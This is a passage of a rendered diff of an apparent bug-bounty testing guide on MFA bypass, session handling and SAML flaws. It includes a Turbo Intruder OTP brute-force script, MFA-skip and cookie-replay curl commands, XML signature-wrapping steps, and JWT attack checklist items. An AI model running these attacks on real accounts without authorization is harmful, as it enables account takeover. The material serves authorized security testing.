+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>□ OAuth flow CSRF-able? (force victim to complete attacker&#39;s flow)
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>□ Auth code in Referer to third-party resources?
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>□ Auth code single-use and short-lived?
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>□ Pre-register with victim email before OAuth (2.4.4)?
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>□ App verifies email from OAuth provider, or trusts it blindly?
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>□ Open redirect on callback page chainable with code theft?
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>□ client_secret visible in client-side JS? (should be server-side only)
+</span></code></pre></div>
+<hr />
+<h2 id="25-multi-factor-authentication-bypass">2.5 Multi-Factor Authentication Bypass<a class="headerlink" href="#25-multi-factor-authentication-bypass" title="Permanent link">&para;</a></h2>
+<h3 id="251-otp-brute-force">2.5.1 OTP Brute-Force<a class="headerlink" href="#251-otp-brute-force" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any 6-digit numeric OTP. A 6-digit OTP has 1,000,000 combinations. Without rate limiting or lockout, it's brute-forceable. Test first: attempt 10 consecutive wrong codes — if no lockout, proceed.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:2"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="__tabbed_3_1">Burp Intruder</label><label for="__tabbed_3_2">Turbo Intruder</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">intruder_otp.sh</span><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># 1. Log in with valid credentials → reach MFA prompt</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="c1"># 2. Intercept OTP submission → Send to Intruder</span>
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="c1"># 3. Mark OTP field as payload position</span>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="c1"># 4. Payload: Numbers 000000–999999</span>
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="c1"># 5. Watch for different response length/redirect on valid code</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-python highlight"><span class="filename">turbo_intruder_otp.py</span><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span> <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>    <span class="k">for</span> <span class="n">otp</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000000</span><span class="p">):</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">otp</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="k">def</span><span class="w"> </span><span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>    <span class="k">if</span> <span class="s2">&quot;dashboard&quot;</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">response</span> <span class="ow">or</span> <span class="s2">&quot;Welcome&quot;</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">response</span><span class="p">:</span>
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>        <span class="n">table</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h3 id="252-response-manipulation">2.5.2 Response Manipulation<a class="headerlink" href="#252-response-manipulation" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>1. Submit wrong OTP code
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>2. Intercept server response: {&quot;mfa_valid&quot;: false}
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>3. Modify to: {&quot;mfa_valid&quot;: true}
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>4. Forward → does app grant access?
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>Request-side tests too:
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>- Add header: X-MFA-Bypass: true
+</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>- Add parameter: &amp;skip_mfa=true
+</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>- Modify body: {&quot;otp&quot;: &quot;000000&quot;, &quot;skip&quot;: true}
+</span></code></pre></div>
+<hr />
+<h3 id="253-mfa-skip-via-direct-navigation">2.5.3 MFA Skip via Direct Navigation<a class="headerlink" href="#253-mfa-skip-via-direct-navigation" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> After completing password auth but before submitting an OTP. Tests whether MFA is enforced server-side or only client-side.</p>
+<div class="language-bash highlight"><span class="filename">mfa_skip.sh</span><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1"># 1. Log in with valid credentials (password auth complete)</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="c1"># 2. When redirected to MFA page, DO NOT submit a code</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="c1"># 3. Directly navigate to protected pages:</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;partial_auth_cookie&gt;&quot;</span><span class="w"> </span>https://target.com/dashboard
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;partial_auth_cookie&gt;&quot;</span><span class="w"> </span>https://target.com/api/v1/user/profile
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="c1"># If data returns → API layer doesn&#39;t enforce MFA</span>
+</span></code></pre></div>
+<hr />
+<h3 id="254-backup-code-and-recovery-abuse">2.5.4 Backup Code and Recovery Abuse<a class="headerlink" href="#254-backup-code-and-recovery-abuse" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>□ Backup code rate limiting: try 10 wrong codes → lockout?
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>□ Backup code reuse: use a valid code, try again → should fail
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>□ Recovery flow bypasses MFA: does &quot;forgot authenticator&quot; skip MFA entirely?
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>□ Password reset → login without MFA?
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>  (if reset logs you in directly → MFA bypassed for any resettable account)
+</span></code></pre></div>
+<hr />
+<h2 id="26-session-management">2.6 Session Management<a class="headerlink" href="#26-session-management" title="Permanent link">&para;</a></h2>
+<h3 id="261-session-fixation">2.6.1 Session Fixation<a class="headerlink" href="#261-session-fixation" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On every login. Takes 30 seconds to test.</p>
+<div class="language-bash highlight"><span class="filename">session_fixation.sh</span><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Note session token before login</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>curl<span class="w"> </span>-sc<span class="w"> </span>pre_login_cookies.txt<span class="w"> </span>https://target.com/<span class="w"> </span>&gt;<span class="w"> </span>/dev/null
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="nv">PRE</span><span class="o">=</span><span class="k">$(</span>grep<span class="w"> </span>-i<span class="w"> </span>session<span class="w"> </span>pre_login_cookies.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $NF}&#39;</span><span class="k">)</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="c1"># Log in</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>curl<span class="w"> </span>-sc<span class="w"> </span>post_login_cookies.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=test&amp;password=test&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="w">  </span>https://target.com/login<span class="w"> </span>&gt;<span class="w"> </span>/dev/null
+</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a><span class="nv">POST</span><span class="o">=</span><span class="k">$(</span>grep<span class="w"> </span>-i<span class="w"> </span>session<span class="w"> </span>post_login_cookies.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $NF}&#39;</span><span class="k">)</span>
+</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>
+</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a><span class="c1"># Compare</span>
+</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PRE</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$POST</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;VULNERABLE: session token unchanged after login&quot;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="262-session-not-invalidated-on-logout">2.6.2 Session Not Invalidated on Logout<a class="headerlink" href="#262-session-not-invalidated-on-logout" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">session_post_logout.sh</span><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># 1. Log in → copy session cookie</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="c1"># 2. Log out normally</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="c1"># 3. Replay saved cookie</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;saved_value&gt;&quot;</span><span class="w"> </span>https://target.com/api/user
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="c1"># Returns authenticated data → server-side session not invalidated</span>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="c1"># Extended tests:</span>
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="c1"># - Change password → old session still valid?</span>
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="c1"># - Change email → old session still valid?</span>
+</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a><span class="c1"># - Deactivate account → active sessions still work?</span>
+</span></code></pre></div>
+<hr />
+<h3 id="263-cookie-security-flags">2.6.3 Cookie Security Flags<a class="headerlink" href="#263-cookie-security-flags" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">cookie_flags_check.sh</span><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>curl<span class="w"> </span>-sv<span class="w"> </span>https://target.com/<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;set-cookie&quot;</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="c1"># Expected: Set-Cookie: session=X; Secure; HttpOnly; SameSite=Strict</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Absent Risk</th>
+<th>Exploitability</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Secure</code></td>
+<td>Cookie sent over HTTP</td>
+<td>Requires network position</td>
+</tr>
+<tr>
+<td><code>HttpOnly</code></td>
+<td><code>document.cookie</code> readable</td>
+<td>Requires XSS</td>
+</tr>
+<tr>
+<td><code>SameSite</code></td>
+<td>Cookie sent cross-site</td>
+<td>Requires CSRF vector</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition info">
+<p class="admonition-title">Standalone flags are Low severity</p>
+<p>Missing cookie flags are Low/Informational on most programs. Report as part of an exploit chain — not standalone — unless the program specifically rewards them.</p>
+</div>
+<hr />
+<h3 id="264-session-token-entropy">2.6.4 Session Token Entropy<a class="headerlink" href="#264-session-token-entropy" title="Permanent link">&para;</a></h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="4:2"><input checked="checked" id="__tabbed_4_1" name="__tabbed_4" type="radio" /><input id="__tabbed_4_2" name="__tabbed_4" type="radio" /><div class="tabbed-labels"><label for="__tabbed_4_1">Burp Sequencer</label><label for="__tabbed_4_2">Manual</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>Proxy → Sequencer → Live capture → select session token response
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>Collect 200+ tokens → Run analysis
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>Result under 80 effective entropy bits → report as weak entropy
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">entropy_manual.sh</span><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..10<span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="w">  </span>curl<span class="w"> </span>-sc<span class="w"> </span>/tmp/c<span class="nv">$i</span>.txt<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;u=test&amp;p=test&quot;</span><span class="w"> </span>https://target.com/login<span class="w"> </span>&gt;<span class="w"> </span>/dev/null
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="w">  </span>grep<span class="w"> </span>-i<span class="w"> </span>session<span class="w"> </span>/tmp/c<span class="nv">$i</span>.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $NF}&#39;</span>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="k">done</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="c1"># Red flags: sequential values, timestamps, &lt; 32 chars, predictable patterns</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h2 id="27-single-sign-on-sso--saml-flaws">2.7 Single Sign-On (SSO) / SAML Flaws<a class="headerlink" href="#27-single-sign-on-sso--saml-flaws" title="Permanent link">&para;</a></h2>
+<h3 id="271-xml-signature-wrapping-xsw">2.7.1 XML Signature Wrapping (XSW)<a class="headerlink" href="#271-xml-signature-wrapping-xsw" title="Permanent link">&para;</a></h3>
+<p><strong>The attack:</strong> XML signature validation and XML parsing can operate on different elements. XSW inserts a forged assertion alongside a legitimately signed one — the signature validates (it's real) but the app processes the forged element.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="5:2"><input checked="checked" id="__tabbed_5_1" name="__tabbed_5" type="radio" /><input id="__tabbed_5_2" name="__tabbed_5" type="radio" /><div class="tabbed-labels"><label for="__tabbed_5_1">SAML Raider (Burp)</label><label for="__tabbed_5_2">Manual</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>1. Install SAML Raider via BApp Store
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>2. Log in via SSO → intercept the SAML Response POST
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>3. Send to SAML Raider tab
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>4. Use &quot;XSW Attacks&quot; → generates all 8 XSW variants automatically
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>5. Test each → watch for successful auth as different user
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">saml_manual.sh</span><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c1"># Decode SAML response (it&#39;s base64)</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;b64_value&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>saml.xml
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="c1"># Edit saml.xml:</span>
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="c1"># - Change NameID to target user</span>
+</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="c1"># - Add wrapping structure around forged assertion</span>
+</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>
+</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="c1"># Re-encode</span>
+</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a>base64<span class="w"> </span>-w0<span class="w"> </span>saml.xml
+</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a><span class="c1"># Replace in request and forward</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h3 id="272-signature-removal-and-replay">2.7.2 Signature Removal and Replay<a class="headerlink" href="#272-signature-removal-and-replay" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>1. Remove &lt;Signature&gt; block entirely from SAML response
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>   → Re-encode and forward → app accepts unsigned assertion?
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>2. Replay a captured SAML response in a new session
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>   → Different browser/IP → accepted?
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>   (proper impl checks InResponseTo ID + NotOnOrAfter timestamp)
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>
+</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>3. Modify NameID without valid signature
+</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>   → Change to admin@target.com → accepted?
+</span></code></pre></div>
+<hr />
+<h3 id="273-audience-and-timestamp-bypass">2.7.3 Audience and Timestamp Bypass<a class="headerlink" href="#273-audience-and-timestamp-bypass" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>1. Audience bypass
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>   → Complete SSO on app-a.target.com → capture SAML response
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>   → Submit same response to app-b.target.com&#39;s ACS endpoint
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>   → Does app-b accept a response intended for app-a?
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>2. Timestamp bypass
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>   → Does app enforce NotBefore / NotOnOrAfter?
+</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>   → Use an expired SAML response → still accepted?
+</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a>
+</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a>3. InResponseTo bypass
+</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a>   → Does app validate that InResponseTo matches a real SP-initiated request?
+</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a>   → Submit IdP-initiated assertion → accepted without a corresponding SP request?
+</span></code></pre></div>
+<hr />
+<h2 id="part-2-complete-checklist">Part 2 Complete Checklist<a class="headerlink" href="#part-2-complete-checklist" title="Permanent link">&para;</a></h2>
+<details class="note">
+<summary>Expand full checklist</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>AUTH BYPASS
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>□ Empty credentials, array input, Content-Type variation, method swap
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>□ Default credentials on admin panels found via recon
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>□ Response manipulation: false → true on auth decision
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>PASSWORD RESET
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a>□ Token entropy: collect 5+ tokens, check for patterns
+</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a>□ Host header injection: Host, X-Forwarded-Host, X-Host, Forwarded
+</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a>□ Token reuse after use
+</span><span id="__span-49-10"><a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a>□ Token still valid after 24 hours
+</span><span id="__span-49-11"><a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a>□ Old token valid after new one requested
+</span><span id="__span-49-12"><a id="__codelineno-49-12" name="__codelineno-49-12" href="#__codelineno-49-12"></a>□ Token bound to wrong account (account A token used for account B)
+</span><span id="__span-49-13"><a id="__codelineno-49-13" name="__codelineno-49-13" href="#__codelineno-49-13"></a>□ Username enumeration via response or timing difference
+</span><span id="__span-49-14"><a id="__codelineno-49-14" name="__codelineno-49-14" href="#__codelineno-49-14"></a>
+</span><span id="__span-49-15"><a id="__codelineno-49-15" name="__codelineno-49-15" href="#__codelineno-49-15"></a>JWT
+</span><span id="__span-49-16"><a id="__codelineno-49-16" name="__codelineno-49-16" href="#__codelineno-49-16"></a>□ Decode and read all claims
+</span><span id="__span-49-17"><a id="__codelineno-49-17" name="__codelineno-49-17" href="#__codelineno-49-17"></a>□ alg:none accepted?
+</span><span id="__span-49-18"><a id="__codelineno-49-18" name="__codelineno-49-18" href="#__codelineno-49-18"></a>□ RS256 → HS256 confusion (get public key from JWKS endpoint)
+</span><span id="__span-49-19"><a id="__codelineno-49-19" name="__codelineno-49-19" href="#__codelineno-49-19"></a>□ Weak secret: hashcat + rockyou
+</span><span id="__span-49-20"><a id="__codelineno-49-20" name="__codelineno-49-20" href="#__codelineno-49-20"></a>□ kid SQLi and path traversal
